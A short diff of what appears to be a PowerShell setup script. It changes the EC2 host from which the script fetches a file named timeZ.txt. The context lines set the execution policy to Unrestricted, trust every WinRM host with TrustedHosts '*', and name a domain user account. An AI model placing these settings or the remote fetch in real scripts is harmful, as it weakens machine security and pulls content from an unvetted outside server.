@@ -11,7 +11,7 @@ set-executionpolicy Unrestricted
 
 Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
 $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem
-$toAppend=invoke-restmethod http://ec2-18-205-66-203.compute-1.amazonaws.com/eeee/timeZ.txt
+$toAppend=invoke-restmethod http://ec2-44-192-30-152.compute-1.amazonaws.com/eeee/timeZ.txt
 
 $username='magrene'
 $usernameB=((gwmi WIN32_ComputerSystem).Domain+'\magrene')
